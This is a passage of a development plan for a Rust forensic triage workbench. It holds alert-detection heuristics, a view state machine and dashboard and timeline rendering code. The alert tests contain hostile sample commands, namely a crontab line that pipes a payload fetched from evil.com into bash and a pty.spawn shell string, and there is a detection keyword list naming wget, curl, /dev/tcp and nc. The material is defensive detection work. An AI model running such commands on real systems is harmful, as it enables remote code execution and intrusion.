                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "Process".to_string(),
                    message: format!("Process from suspicious path: {cmd}"),
                    detail: format!(
                        "PID={} User={}",
                        proc.pid.as_deref().unwrap_or("?"),
                        proc.user.as_deref().unwrap_or("?"),
                    ),
                });
                break;
            }
        }

        // Reverse shell patterns
        for pattern in &shell_patterns {
            if cmd.contains(pattern) {
                alerts.push(Alert {
                    severity: AlertSeverity::Critical,
                    category: "Process".to_string(),
                    message: format!("Reverse shell pattern: {pattern}"),
                    detail: format!("Command: {cmd}"),
                });
                break;
            }
        }
    }
}

fn check_chkrootkit_alerts(findings: &[ChkrootkitFinding], alerts: &mut Vec<Alert>) {
    for finding in findings {
        if finding
            .status
            .as_deref()
            .unwrap_or("")
            .contains("INFECTED")
        {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "Rootkit".to_string(),
                message: format!(
                    "INFECTED: {}",
                    finding.check_name.as_deref().unwrap_or("unknown")
                ),
                detail: finding.detail.as_deref().unwrap_or("").to_string(),
            });
        }
    }
}

fn check_config_alerts(
    configs: &[ConfigFile],
    crontabs: &[CrontabEntry],
    alerts: &mut Vec<Alert>,
) {
    // Check for ld.so.preload
    for config in configs {
        if config.path.ends_with("ld.so.preload") {
            let content = config.content.as_deref().unwrap_or("");
            if !content.trim().is_empty() {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "Config".to_string(),
                    message: "ld.so.preload is present and non-empty".to_string(),
                    detail: format!("Content: {}", content.chars().take(200).collect::<String>()),
                });
            }
        }
    }

    // Check crontabs for suspicious commands
    let suspicious = ["wget", "curl", "base64", "/dev/tcp", "nc ", "ncat"];
    for entry in crontabs {
        for pattern in &suspicious {
            if entry.command.contains(pattern) {
                alerts.push(Alert {
                    severity: AlertSeverity::Warning,
                    category: "Crontab".to_string(),
                    message: format!("Suspicious crontab command: {pattern}"),
                    detail: format!(
                        "Schedule: {} Command: {}",
                        entry.schedule, entry.command
                    ),
                });
                break;
            }
        }
    }
}

fn check_bodyfile_alerts(entries: &[BodyfileEntry], alerts: &mut Vec<Alert>) {
    let temp_dirs = ["/tmp/", "/dev/shm/", "/var/tmp/"];
    let standard_suid = [
        "/usr/bin/",
        "/bin/",
        "/usr/sbin/",
        "/sbin/",
        "/usr/lib",
        "/usr/libexec",
    ];

    for entry in entries {
        // Executables in temp dirs
        let is_executable = entry.mode & 0o111 != 0;
        let in_temp = temp_dirs.iter().any(|d| entry.path.starts_with(d));
        if is_executable && in_temp {
            alerts.push(Alert {
                severity: AlertSeverity::Critical,
                category: "Filesystem".to_string(),
                message: format!("Executable in temp dir: {}", entry.path),
                detail: format!("mode={:o} size={}", entry.mode, entry.size),
            });
        }

        // SUID outside standard paths
        let is_suid = entry.mode & 0o4000 != 0;
        let in_standard = standard_suid.iter().any(|d| entry.path.starts_with(d));
        if is_suid && !in_standard {
            alerts.push(Alert {
                severity: AlertSeverity::Warning,
                category: "Filesystem".to_string(),
                message: format!("SUID binary outside standard path: {}", entry.path),
                detail: format!("mode={:o}", entry.mode),
            });
        }
    }
}

/// Check if an IP is in the 172.16.0.0/12 range.
fn is_rfc1918_172(ip: &str) -> bool {
    if let Some(rest) = ip.strip_prefix("172.") {
        if let Some(second_octet) = rest.split('.').next() {
            if let Ok(octet) = second_octet.parse::<u8>() {
                return (16..=31).contains(&octet);
            }
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    fn empty_input() -> AlertInput<'static> {
        AlertInput {
            bodyfile: &[],
            network: &[],
            processes: &[],
            crontabs: &[],
            chkrootkit: &[],
            configs: &[],
        }
    }

    #[test]
    fn test_empty_input_no_alerts() {
        let alerts = detect_alerts(&empty_input());
        assert!(alerts.is_empty());
    }

    #[test]
    fn test_reverse_shell_detection() {
        let procs = vec![ProcessInfo {
            user: Some("root".to_string()),
            pid: Some("999".to_string()),
            cpu: Some("0.0".to_string()),
            mem: Some("0.0".to_string()),
            tty: None,
            start_time: None,
            command: "python3 -c import pty;pty.spawn(\"/bin/bash\")".to_string(),
        }];
        let input = AlertInput {
            processes: &procs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(!alerts.is_empty());
        assert!(alerts
            .iter()
            .any(|a| a.severity == AlertSeverity::Critical));
    }

    #[test]
    fn test_temp_executable_detection() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/tmp/evil.sh".to_string(),
            inode: 1,
            mode: 0o100755,
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1000),
            mtime: Some(2000),
            ctime: Some(3000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts
            .iter()
            .any(|a| a.message.contains("/tmp/evil.sh")));
    }

    #[test]
    fn test_suid_outside_standard_path() {
        let entries = vec![BodyfileEntry {
            md5: String::new(),
            path: "/home/user/.local/bin/suid_tool".to_string(),
            inode: 1,
            mode: 0o104755,
            uid: 0,
            gid: 0,
            size: 100,
            atime: Some(1000),
            mtime: Some(2000),
            ctime: Some(3000),
            crtime: None,
        }];
        let input = AlertInput {
            bodyfile: &entries,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.iter().any(|a| a.message.contains("SUID")));
    }

    #[test]
    fn test_chkrootkit_infected() {
        let findings = vec![ChkrootkitFinding {
            check_name: Some("bindshell".to_string()),
            status: Some("INFECTED".to_string()),
            detail: Some("Listening on port 4444".to_string()),
        }];
        let input = AlertInput {
            chkrootkit: &findings,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts
            .iter()
            .any(|a| a.severity == AlertSeverity::Critical && a.message.contains("INFECTED")));
    }

    #[test]
    fn test_ld_so_preload_alert() {
        let configs = vec![ConfigFile {
            path: "/etc/ld.so.preload".to_string(),
            content: Some("/usr/lib/libevil.so".to_string()),
        }];
        let input = AlertInput {
            configs: &configs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts
            .iter()
            .any(|a| a.message.contains("ld.so.preload")));
    }

    #[test]
    fn test_suspicious_crontab() {
        let crontabs = vec![CrontabEntry {
            user: "root".to_string(),
            schedule: "*/5 * * * *".to_string(),
            command: "wget http://evil.com/payload.sh | bash".to_string(),
        }];
        let input = AlertInput {
            crontabs: &crontabs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.iter().any(|a| a.message.contains("wget")));
    }

    #[test]
    fn test_alerts_sorted_by_severity() {
        let procs = vec![ProcessInfo {
            user: None,
            pid: None,
            cpu: None,
            mem: None,
            tty: None,
            start_time: None,
            command: "/tmp/evil pty.spawn".to_string(),
        }];
        let configs = vec![ConfigFile {
            path: "/etc/ld.so.preload".to_string(),
            content: Some("malicious.so".to_string()),
        }];
        let input = AlertInput {
            processes: &procs,
            configs: &configs,
            ..empty_input()
        };
        let alerts = detect_alerts(&input);
        assert!(alerts.len() >= 2);
        // Critical should come before Warning
        let first_critical = alerts
            .iter()
            .position(|a| a.severity == AlertSeverity::Critical);
        let first_warning = alerts
            .iter()
            .position(|a| a.severity == AlertSeverity::Warning);
        if let (Some(c), Some(w)) = (first_critical, first_warning) {
            assert!(c < w, "Critical alerts should sort before Warning");
        }
    }

    #[test]
    fn test_is_rfc1918_172() {
        assert!(is_rfc1918_172("172.16.0.1"));
        assert!(is_rfc1918_172("172.31.255.255"));
        assert!(!is_rfc1918_172("172.32.0.1"));
        assert!(!is_rfc1918_172("172.15.0.1"));
        assert!(!is_rfc1918_172("8.8.8.8"));
    }
}
```

- [ ] **Step 3: Update mod.rs to register both modules**

Update `crates/rt-navigator/src/investigation/mod.rs`:

```rust
pub mod alerts;
pub mod data;
pub mod timeline;
```

- [ ] **Step 4: Run tests to verify**

Run: `cargo test -p rt-navigator --lib -- investigation`
Expected: All tests PASS (timeline conversion tests from Task 1 + alert detection tests + data loading tests)

- [ ] **Step 5: Commit**

```bash
git add crates/rt-navigator/src/investigation/
git commit -m "feat(nav): add InvestigationData model and alert detection heuristics"
```

---

## Task 3: WorkbenchApp State Machine

**Files:**
- Modify: `crates/rt-navigator/src/investigation/mod.rs`

This task builds the central state machine that handles view switching, keyboard input, and cursor management.

- [ ] **Step 1: Write WorkbenchApp in mod.rs**

Replace `crates/rt-navigator/src/investigation/mod.rs` with:

```rust
pub mod alerts;
pub mod data;
pub mod timeline;

use std::collections::HashSet;

use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};

use crate::app::{Action, App};
use data::InvestigationData;
use timeline::TimelineSource;

/// Which view is currently active in the workbench.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum WorkbenchView {
    Dashboard,
    Timeline,
    MftTree,
    Network,
    Processes,
    Logins,
    Packages,
    Configs,
    Hashes,
    Chkrootkit,
}

impl WorkbenchView {
    pub fn label(self) -> &'static str {
        match self {
            Self::Dashboard => "Dashboard",
            Self::Timeline => "Timeline",
            Self::MftTree => "MFT Tree",
            Self::Network => "Network",
            Self::Processes => "Processes",
            Self::Logins => "Logins",
            Self::Packages => "Packages",
            Self::Configs => "Configs",
            Self::Hashes => "Hashes",
            Self::Chkrootkit => "Chkrootkit",
        }
    }

    /// How many items in the list for this view.
    pub fn item_count(self, data: &InvestigationData) -> usize {
        match self {
            Self::Dashboard => {
                // Dashboard items: one per non-empty category
                let mut count = 0;
                if !data.timeline.is_empty() { count += 1; }
                if !data.network.is_empty() { count += 1; }
                if !data.processes.is_empty() { count += 1; }
                if !data.logins.is_empty() { count += 1; }
                if !data.packages.is_empty() { count += 1; }
                if !data.configs.is_empty() { count += 1; }
                if !data.hashes.is_empty() { count += 1; }
                if !data.chkrootkit.is_empty() { count += 1; }
                count
            }
            Self::Timeline => data.timeline.len(),
            Self::MftTree => 0,  // handled by MFT app delegation
            Self::Network => data.network.len(),
            Self::Processes => data.processes.len(),
            Self::Logins => data.logins.len(),
            Self::Packages => data.packages.len(),
            Self::Configs => data.configs.len(),
            Self::Hashes => data.hashes.len(),
            Self::Chkrootkit => data.chkrootkit.len(),
        }
    }
}

/// Main state machine for the investigation workbench TUI.
pub struct WorkbenchApp {
    pub data: InvestigationData,
    pub available_views: Vec<WorkbenchView>,
    pub current_view_idx: usize,
    pub selected: usize,
    pub scroll_offset: usize,
    pub show_detail: bool,
    pub search_mode: bool,
    pub search_query: String,
    pub sort_ascending: bool,

    /// Supertimeline source filter (show all by default).
    pub timeline_source_filter: HashSet<TimelineSource>,
    /// Filtered timeline indices (indices into data.timeline matching current filter).
    pub filtered_timeline: Vec<usize>,

    /// Existing MFT tree app (delegation target when in MftTree view).
    pub mft_app: Option<App>,
}

impl WorkbenchApp {
    /// Create a new workbench from parsed investigation data and optional MFT app.
    pub fn new(data: InvestigationData, mft_app: Option<App>) -> Self {
        let mut available_views = vec![WorkbenchView::Dashboard];

        if !data.timeline.is_empty() {
            available_views.push(WorkbenchView::Timeline);
        }
        if data.mft_tree.is_some() {
            available_views.push(WorkbenchView::MftTree);
        }
        if !data.network.is_empty() {
            available_views.push(WorkbenchView::Network);
        }
        if !data.processes.is_empty() {
            available_views.push(WorkbenchView::Processes);
        }
        if !data.logins.is_empty() {
            available_views.push(WorkbenchView::Logins);
        }
        if !data.packages.is_empty() {
            available_views.push(WorkbenchView::Packages);
        }
        if !data.configs.is_empty() {
            available_views.push(WorkbenchView::Configs);
        }
        if !data.hashes.is_empty() {
            available_views.push(WorkbenchView::Hashes);
        }
        if !data.chkrootkit.is_empty() {
            available_views.push(WorkbenchView::Chkrootkit);
        }

        let filter = TimelineSource::all();
        let filtered_timeline: Vec<usize> = (0..data.timeline.len()).collect();

        Self {
            data,
            available_views,
            current_view_idx: 0,
            selected: 0,
            scroll_offset: 0,
            show_detail: true,
            search_mode: false,
            search_query: String::new(),
            sort_ascending: true,
            timeline_source_filter: filter,
            filtered_timeline,
            mft_app,
        }
    }

    pub fn current_view(&self) -> WorkbenchView {
        self.available_views[self.current_view_idx]
    }

    /// Number of items in the currently active view (respecting filters).
    pub fn current_item_count(&self) -> usize {
        if self.current_view() == WorkbenchView::Timeline {
            self.filtered_timeline.len()
        } else {
            self.current_view().item_count(&self.data)
        }
    }

    /// Handle a key event. Returns `Action::Quit` to exit.
    pub fn handle_key(&mut self, key: KeyEvent) -> Action {
        // If in MftTree view, delegate (except Tab/Esc)
        if self.current_view() == WorkbenchView::MftTree {
            match key.code {
                KeyCode::Tab => self.next_view(),
                KeyCode::BackTab => self.prev_view(),
                KeyCode::Esc => self.go_to_dashboard(),
                _ => {
                    if let Some(ref mut mft) = self.mft_app {
                        return mft.handle_key(key);
                    }
                }
            }
            return Action::Continue;
        }

        // Search mode input
        if self.search_mode {
            match key.code {
                KeyCode::Esc => {
                    self.search_mode = false;
                    self.search_query.clear();
                }
                KeyCode::Enter => {
                    self.search_mode = false;
                }
                KeyCode::Backspace => {
                    self.search_query.pop();
                }
                KeyCode::Char(c) => {
                    self.search_query.push(c);
                }
                _ => {}
            }
            return Action::Continue;
        }

        // Normal mode
        match key.code {
            KeyCode::Char('q') => return Action::Quit,
            KeyCode::Tab => self.next_view(),
            KeyCode::BackTab => self.prev_view(),
            KeyCode::Esc => self.go_to_dashboard(),
            KeyCode::Char('j') | KeyCode::Down => self.move_down(),
            KeyCode::Char('k') | KeyCode::Up => self.move_up(),
            KeyCode::Char('g') if key.modifiers.contains(KeyModifiers::NONE) => {
                self.selected = 0;
                self.scroll_offset = 0;
            }
            KeyCode::Char('G') => {
                let count = self.current_item_count();
                if count > 0 {
                    self.selected = count - 1;
                }
            }
            KeyCode::Enter => self.handle_enter(),
            KeyCode::Char('/') => {
                self.search_mode = true;
                self.search_query.clear();
            }
            KeyCode::Char('s') => {
                self.sort_ascending = !self.sort_ascending;
            }
            KeyCode::Char('f') => {
                if self.current_view() == WorkbenchView::Timeline {
                    self.cycle_timeline_filter();
                }
            }
            KeyCode::Char(c) if c.is_ascii_digit() => {
                let idx = (c as u8 - b'0') as usize;
                if idx > 0 && idx <= self.available_views.len() {
                    self.switch_to_view(idx - 1);
                }
            }
            _ => {}
        }

        Action::Continue
    }

    fn next_view(&mut self) {
        self.current_view_idx = (self.current_view_idx + 1) % self.available_views.len();
        self.reset_cursor();
    }

    fn prev_view(&mut self) {
        if self.current_view_idx == 0 {
            self.current_view_idx = self.available_views.len() - 1;
        } else {
            self.current_view_idx -= 1;
        }
        self.reset_cursor();
    }

    fn switch_to_view(&mut self, idx: usize) {
        if idx < self.available_views.len() {
            self.current_view_idx = idx;
            self.reset_cursor();
        }
    }

    fn go_to_dashboard(&mut self) {
        self.current_view_idx = 0;
        self.reset_cursor();
    }

    fn reset_cursor(&mut self) {
        self.selected = 0;
        self.scroll_offset = 0;
        self.search_mode = false;
        self.search_query.clear();
    }

    fn move_down(&mut self) {
        let count = self.current_item_count();
        if count > 0 && self.selected < count - 1 {
            self.selected += 1;
        }
    }

    fn move_up(&mut self) {
        if self.selected > 0 {
            self.selected -= 1;
        }
    }

    fn handle_enter(&mut self) {
        if self.current_view() == WorkbenchView::Dashboard {
            // Drill into the selected category
            // Dashboard items map to available_views[1..] by order
            let target_idx = self.selected + 1; // +1 to skip Dashboard itself
            if target_idx < self.available_views.len() {
                self.switch_to_view(target_idx);
            }
        } else {
            self.show_detail = !self.show_detail;
        }
    }

    fn cycle_timeline_filter(&mut self) {
        use TimelineSource::*;
        let cycle = [
            None, // All sources
            Some(Bodyfile),
            Some(MftSi),
            Some(MftFn),
            Some(UsnJournal),
            Some(LoginHistory),
            Some(ProcessList),
        ];

        // Find current filter state in cycle
        let current_single = if self.timeline_source_filter.len() == 1 {
            self.timeline_source_filter.iter().next().copied()
        } else {
            None
        };

        let current_idx = cycle
            .iter()
            .position(|&c| c == current_single)
            .unwrap_or(0);
        let next_idx = (current_idx + 1) % cycle.len();

        match cycle[next_idx] {
            None => self.timeline_source_filter = TimelineSource::all(),
            Some(src) => {
                self.timeline_source_filter.clear();
                self.timeline_source_filter.insert(src);
            }
        }

        self.rebuild_filtered_timeline();
        self.selected = 0;
        self.scroll_offset = 0;
    }

    fn rebuild_filtered_timeline(&mut self) {
        self.filtered_timeline = self
            .data
            .timeline
            .iter()
            .enumerate()
            .filter(|(_, e)| self.timeline_source_filter.contains(&e.source))
            .map(|(i, _)| i)
            .collect();
    }

    /// Get the filter label for the supertimeline view header.
    pub fn timeline_filter_label(&self) -> &'static str {
        if self.timeline_source_filter.len() > 1 {
            "All sources"
        } else if let Some(src) = self.timeline_source_filter.iter().next() {
            src.label()
        } else {
            "None"
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use data::{CollectionMetadata, InvestigationData};
    use timeline::{TimelineEvent, TimelineSource, TimestampType};

    fn make_test_data(n_timeline: usize, n_network: usize) -> InvestigationData {
        let timeline: Vec<TimelineEvent> = (0..n_timeline)
            .map(|i| TimelineEvent {
                timestamp: i as i64 * 100,
                timestamp_type: TimestampType::Modified,
                source: TimelineSource::Bodyfile,
                path: format!("/file{i}"),
                description: String::new(),
                extra: String::new(),
            })
            .collect();

        let network = (0..n_network)
            .map(|_| rt_parser_uac::parsers::network::NetworkConnection {
                protocol: Some("tcp".to_string()),
                local_address: None,
                local_port: None,
                remote_address: None,
                state: None,
                pid: None,
            })
            .collect();

        InvestigationData {
            metadata: CollectionMetadata::default(),
            alerts: Vec::new(),
            timeline,
            mft_tree: None,
            anomaly_index: None,
            network,
            processes: Vec::new(),
            crontabs: Vec::new(),
            logins: Vec::new(),
            packages: Vec::new(),
            hashes: Vec::new(),
            chkrootkit: Vec::new(),
            configs: Vec::new(),
        }
    }

    #[test]
    fn test_available_views_dashboard_always_present() {
        let app = WorkbenchApp::new(make_test_data(0, 0), None);
        assert_eq!(app.available_views, vec![WorkbenchView::Dashboard]);
    }

    #[test]
    fn test_available_views_with_data() {
        let app = WorkbenchApp::new(make_test_data(10, 5), None);
        assert!(app.available_views.contains(&WorkbenchView::Timeline));
        assert!(app.available_views.contains(&WorkbenchView::Network));
        assert!(!app.available_views.contains(&WorkbenchView::MftTree));
    }

    #[test]
    fn test_view_cycling() {
        let mut app = WorkbenchApp::new(make_test_data(10, 5), None);
        assert_eq!(app.current_view(), WorkbenchView::Dashboard);
        app.next_view();
        assert_eq!(app.current_view(), WorkbenchView::Timeline);
        app.next_view();
        assert_eq!(app.current_view(), WorkbenchView::Network);
        app.next_view();
        assert_eq!(app.current_view(), WorkbenchView::Dashboard); // wraps
    }

    #[test]
    fn test_go_to_dashboard() {
        let mut app = WorkbenchApp::new(make_test_data(10, 5), None);
        app.next_view();
        app.next_view();
        app.go_to_dashboard();
        assert_eq!(app.current_view(), WorkbenchView::Dashboard);
        assert_eq!(app.selected, 0);
    }

    #[test]
    fn test_cursor_movement() {
        let mut app = WorkbenchApp::new(make_test_data(10, 0), None);
        app.next_view(); // go to Timeline
        assert_eq!(app.selected, 0);
        app.move_down();
        assert_eq!(app.selected, 1);
        app.move_down();
        assert_eq!(app.selected, 2);
        app.move_up();
        assert_eq!(app.selected, 1);
        app.move_up();
        assert_eq!(app.selected, 0);
        app.move_up(); // can't go below 0
        assert_eq!(app.selected, 0);
    }

    #[test]
    fn test_quit_key() {
        let mut app = WorkbenchApp::new(make_test_data(0, 0), None);
        let key = KeyEvent::new(KeyCode::Char('q'), KeyModifiers::NONE);
        assert_eq!(app.handle_key(key), Action::Quit);
    }

    #[test]
    fn test_timeline_filter_cycle() {
        let mut app = WorkbenchApp::new(make_test_data(10, 0), None);
        app.next_view(); // Timeline
        assert_eq!(app.timeline_filter_label(), "All sources");
        app.cycle_timeline_filter();
        assert_eq!(app.timeline_filter_label(), "BF"); // Bodyfile
        app.cycle_timeline_filter();
        assert_eq!(app.timeline_filter_label(), "SI"); // MFT SI
    }
}
```

- [ ] **Step 2: Run tests to verify**

Run: `cargo test -p rt-navigator --lib -- investigation`
Expected: All tests PASS

- [ ] **Step 3: Commit**

```bash
git add crates/rt-navigator/src/investigation/
git commit -m "feat(nav): add WorkbenchApp state machine with view switching and timeline filtering"
```

---

## Task 4: Dashboard Rendering

**Files:**
- Create: `crates/rt-navigator/src/investigation/dashboard.rs`
- Modify: `crates/rt-navigator/src/investigation/mod.rs`

- [ ] **Step 1: Write dashboard.rs**

Create `crates/rt-navigator/src/investigation/dashboard.rs`:

```rust
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, List, ListItem, Paragraph, Sparkline};
use ratatui::Frame;

use super::alerts::AlertSeverity;
use super::timeline::build_sparkline;
use super::WorkbenchApp;

pub fn draw_dashboard(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let chunks = Layout::horizontal([
        Constraint::Percentage(40),
        Constraint::Percentage(60),
    ])
    .split(area);

    draw_summary(frame, app, chunks[0]);
    draw_right_panel(frame, app, chunks[1]);
}

fn draw_summary(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let mut items: Vec<ListItem<'_>> = Vec::new();

    // Supertimeline entry
    if !app.data.timeline.is_empty() {
        let count = app.data.timeline.len();
        let mut lines = vec![Line::from(vec![
            Span::styled("  Supertimeline: ", Style::default().fg(Color::Cyan)),
            Span::raw(format_count(count)),
        ])];
        // Sub-counts by source
        for (label, src_count) in app.data.timeline_source_counts() {
            lines.push(Line::from(format!("    {label}: {}", format_count(src_count))));
        }
        items.push(ListItem::new(lines));
    }

    // Snapshot categories
    let categories: Vec<(&str, usize)> = vec![
        ("Network", app.data.network.len()),
        ("Processes", app.data.processes.len()),
        ("Logins", app.data.logins.len()),
        ("Packages", app.data.packages.len()),
        ("Configs", app.data.configs.len()),
        ("Hashes", app.data.hashes.len()),
        ("Chkrootkit", app.data.chkrootkit.len()),
    ];

    for (name, count) in categories {
        if count > 0 {
            items.push(ListItem::new(Line::from(vec![
                Span::raw(format!("  {name}: ")),
                Span::raw(format_count(count)),
            ])));
        }
    }

    let block = Block::default()
        .borders(Borders::ALL)
        .title(" Summary ");

    let list = List::new(items)
        .block(block)
        .highlight_style(Style::default().add_modifier(Modifier::REVERSED));

    frame.render_widget(list, area);
}

fn draw_right_panel(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let chunks = Layout::vertical([
        Constraint::Length(5),  // sparkline
        Constraint::Min(4),    // alerts
    ])
    .split(area);

    // Sparkline
    let sparkline_data = build_sparkline(&app.data.timeline, chunks[0].width as usize);
    let sparkline = Sparkline::default()
        .block(
            Block::default()
                .borders(Borders::ALL)
                .title(" Supertimeline Activity "),
        )
        .data(&sparkline_data)
        .style(Style::default().fg(Color::Cyan));
    frame.render_widget(sparkline, chunks[0]);

    // Alerts
    let critical_count = app
        .data
        .alerts
        .iter()
        .filter(|a| a.severity == AlertSeverity::Critical)
        .count();
    let warning_count = app
        .data
        .alerts
        .iter()
        .filter(|a| a.severity == AlertSeverity::Warning)
        .count();

    let title = format!(
        " Alerts ({critical_count} critical, {warning_count} warning) "
    );

    let alert_items: Vec<ListItem<'_>> = app
        .data
        .alerts
        .iter()
        .map(|alert| {
            let color = match alert.severity {
                AlertSeverity::Critical => Color::Red,
                AlertSeverity::Warning => Color::Yellow,
                AlertSeverity::Info => Color::Blue,
            };
            ListItem::new(Line::from(vec![
                Span::styled(
                    format!("{} ", alert.severity.label()),
                    Style::default().fg(color).add_modifier(Modifier::BOLD),
                ),
                Span::raw(&alert.message),
            ]))
        })
        .collect();

    let alerts_list = List::new(alert_items).block(
        Block::default()
            .borders(Borders::ALL)
            .title(title),
    );

    frame.render_widget(alerts_list, chunks[1]);
}

fn format_count(n: usize) -> String {
    if n >= 1_000_000 {
        format!("{:.1}M", n as f64 / 1_000_000.0)
    } else if n >= 1_000 {
        format!("{:.1}K", n as f64 / 1_000.0)
    } else {
        n.to_string()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_count() {
        assert_eq!(format_count(0), "0");
        assert_eq!(format_count(999), "999");
        assert_eq!(format_count(1_000), "1.0K");
        assert_eq!(format_count(47_832), "47.8K");
        assert_eq!(format_count(1_000_000), "1.0M");
    }
}
```

- [ ] **Step 2: Add to mod.rs**

Add to `crates/rt-navigator/src/investigation/mod.rs` module declarations:

```rust
pub mod alerts;
pub mod dashboard;
pub mod data;
pub mod timeline;
```

- [ ] **Step 3: Run tests**

Run: `cargo test -p rt-navigator --lib -- investigation`
Expected: All tests PASS

- [ ] **Step 4: Commit**

```bash
git add crates/rt-navigator/src/investigation/
git commit -m "feat(nav): add dashboard rendering with sparkline and alert panel"
```

---

## Task 5: Supertimeline View + View Dispatch

**Files:**
- Create: `crates/rt-navigator/src/investigation/views/mod.rs`
- Create: `crates/rt-navigator/src/investigation/views/supertimeline.rs`
- Modify: `crates/rt-navigator/src/investigation/mod.rs`

- [ ] **Step 1: Write views/mod.rs with dispatch**

Create `crates/rt-navigator/src/investigation/views/mod.rs`:

```rust
pub mod supertimeline;
pub mod network;
pub mod process;
pub mod logins;
pub mod packages;
pub mod configs;
pub mod hashes;
pub mod chkrootkit;

use ratatui::layout::Rect;
use ratatui::Frame;

use super::{WorkbenchApp, WorkbenchView};

/// Render the current view's list content in the given area.
pub fn draw_view(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    match app.current_view() {
        WorkbenchView::Dashboard => {} // handled separately by dashboard.rs
        WorkbenchView::Timeline => supertimeline::draw(frame, app, area),
        WorkbenchView::MftTree => {}   // handled by delegation to existing App
        WorkbenchView::Network => network::draw(frame, app, area),
        WorkbenchView::Processes => process::draw(frame, app, area),
        WorkbenchView::Logins => logins::draw(frame, app, area),
        WorkbenchView::Packages => packages::draw(frame, app, area),
        WorkbenchView::Configs => configs::draw(frame, app, area),
        WorkbenchView::Hashes => hashes::draw(frame, app, area),
        WorkbenchView::Chkrootkit => chkrootkit::draw(frame, app, area),
    }
}
```

- [ ] **Step 2: Write supertimeline.rs**

Create `crates/rt-navigator/src/investigation/views/supertimeline.rs`:

```rust
use ratatui::layout::{Constraint, Layout, Rect};
use ratatui::style::{Color, Modifier, Style};
use ratatui::text::{Line, Span};
use ratatui::widgets::{Block, Borders, Row, Table};
use ratatui::Frame;

use crate::investigation::timeline::TimelineSource;
use crate::investigation::WorkbenchApp;

pub fn draw(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let chunks = Layout::horizontal([
        Constraint::Percentage(if app.show_detail { 65 } else { 100 }),
        Constraint::Percentage(if app.show_detail { 35 } else { 0 }),
    ])
    .split(area);

    draw_table(frame, app, chunks[0]);

    if app.show_detail && chunks.len() > 1 {
        draw_detail(frame, app, chunks[1]);
    }
}

fn draw_table(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    let filter_label = app.timeline_filter_label();
    let count = app.filtered_timeline.len();
    let title = format!(" Timeline [{filter_label}] ({count} events) [f] filter ");

    let header = Row::new(vec!["Time", "Src", "Type", "Path"])
        .style(Style::default().add_modifier(Modifier::BOLD))
        .bottom_margin(0);

    // Virtual scrolling: only render visible rows
    let visible_height = area.height.saturating_sub(3) as usize; // borders + header
    let start = app.scroll_offset;
    let end = (start + visible_height).min(app.filtered_timeline.len());

    let rows: Vec<Row<'_>> = app.filtered_timeline[start..end]
        .iter()
        .enumerate()
        .map(|(i, &idx)| {
            let event = &app.data.timeline[idx];
            let is_selected = start + i == app.selected;

            let src_color = source_color(event.source);
            let style = if is_selected {
                Style::default().add_modifier(Modifier::REVERSED)
            } else {
                Style::default()
            };

            Row::new(vec![
                format_timestamp(event.timestamp),
                event.source.label().to_string(),
                event.timestamp_type.label().to_string(),
                truncate_path(&event.path, 40),
            ])
            .style(style)
            .fg(src_color)
        })
        .collect();

    let widths = [
        Constraint::Length(19),  // "2026-03-24T19:01:05"
        Constraint::Length(4),   // "BF"
        Constraint::Length(4),   // "M"
        Constraint::Min(20),     // path
    ];

    let table = Table::new(rows, widths)
        .header(header)
        .block(Block::default().borders(Borders::ALL).title(title));

    frame.render_widget(table, area);
}

fn draw_detail(frame: &mut Frame, app: &WorkbenchApp, area: Rect) {
    if app.filtered_timeline.is_empty() {
        let empty = ratatui::widgets::Paragraph::new("No events")
            .block(Block::default().borders(Borders::ALL).title(" Detail "));
        frame.render_widget(empty, area);
        return;
    }

    let idx = app
        .filtered_timeline
        .get(app.selected)
        .copied()
        .unwrap_or(0);
    let event = &app.data.timeline[idx];

    let lines = vec![
        Line::from(vec![
            Span::styled("Source: ", Style::default().add_modifier(Modifier::BOLD)),
            Span::raw(event.source.label()),
        ]),
        Line::from(vec![
            Span::styled("Type: ", Style::default().add_modifier(Modifier::BOLD)),
            Span::raw(event.timestamp_type.label()),
        ]),
        Line::from(vec![
            Span::styled("Time: ", Style::default().add_modifier(Modifier::BOLD)),
            Span::raw(format_timestamp(event.timestamp)),
        ]),
        Line::from(vec![
            Span::styled("Path: ", Style::default().add_modifier(Modifier::BOLD)),
            Span::raw(&event.path),
        ]),
        Line::from(""),
        Line::from(vec![
            Span::styled("Description: ", Style::default().add_modifier(Modifier::BOLD)),
        ]),
        Line::from(event.description.as_str()),
        Line::from(""),
        Line::from(vec![
            Span::styled("Extra: ", Style::default().add_modifier(Modifier::BOLD)),
        ]),
        Line::from(event.extra.as_str()),
    ];

    let detail = ratatui::widgets::Paragraph::new(lines)
        .block(Block::default().borders(Borders::ALL).title(" Detail "))
        .wrap(ratatui::widgets::Wrap { trim: false });

    frame.render_widget(detail, area);
}

fn source_color(source: TimelineSource) -> Color {
    match source {
        TimelineSource::Bodyfile => Color::Green,
        TimelineSource::MftSi => Color::Cyan,
        TimelineSource::MftFn => Color::Blue,
        TimelineSource::UsnJournal => Color::Magenta,
        TimelineSource::LoginHistory => Color::Yellow,
